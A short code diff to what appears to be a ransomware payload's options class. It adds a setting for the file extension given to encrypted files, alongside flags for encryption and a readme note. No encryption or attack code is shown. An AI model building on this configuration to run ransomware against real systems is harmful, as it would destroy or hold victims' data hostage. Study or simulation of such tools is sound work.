@@ -9,6 +9,7 @@ logger = logging.getLogger(__name__)
 class RansomwareOptions:
     def __init__(self, options: dict):
         self.encryption_enabled = options["encryption"]["enabled"]
+        self.file_extension = options["encryption"]["file_extension"]
         self.readme_enabled = options["other_behaviors"]["readme"]
 
         self.target_directory = None
